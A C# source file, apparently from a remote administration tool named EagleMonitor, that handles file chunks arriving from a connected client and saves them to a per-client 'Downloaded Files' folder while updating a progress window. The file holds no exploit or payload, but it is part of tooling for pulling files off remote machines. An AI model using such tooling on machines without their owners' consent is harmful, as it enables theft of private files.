using EagleMonitor.Forms;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class DownloadFilePacketHandler
    {
        public DownloadFilePacketHandler(DownloadFilePacket downloadFilePacket, ClientHandler clientHandler) : base()
        {
            string formName = downloadFilePacket.baseIp + ":" + Miscellaneous.SplitPath(downloadFilePacket.fileName);

            FileManagerForm.downloadForms[formName].BeginInvoke((MethodInvoker)(() => 
            {
                using (var stream = new FileStream(ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), FileMode.Append))
                {
                    stream.Write(downloadFilePacket.file, 0, downloadFilePacket.file.Length);
                }

                FileManagerForm.downloadForms[formName].clientHandler = clientHandler;
                FileManagerForm.downloadForms[formName].currentDownloaded += downloadFilePacket.file.Length;
                FileManagerForm.downloadForms[formName].guna2ProgressBar1.Value += downloadFilePacket.file.Length;

                decimal pourcentage = (decimal)FileManagerForm.downloadForms[formName].currentDownloaded / FileManagerForm.downloadForms[formName].totalSize;
                decimal final = Decimal.Round(pourcentage * 100, 2);

                FileManagerForm.downloadForms[formName].label2.Text = $"{final}%";

                FileManagerForm.downloadForms[formName].labelSize.Text = $"{Miscellaneous.Numeric2Bytes(FileManagerForm.downloadForms[formName].currentDownloaded)} / {Miscellaneous.Numeric2Bytes(FileManagerForm.downloadForms[formName].totalSize)}";

                if (FileManagerForm.downloadForms[formName].currentDownloaded == FileManagerForm.downloadForms[formName].totalSize)
                {
                    FileManagerForm.downloadForms[formName].Close();
                    FileManagerForm.downloadForms.Remove(formName);
                    clientHandler.Dispose();
                }

                downloadFilePacket.file = null;

            }));
        }
    }
}
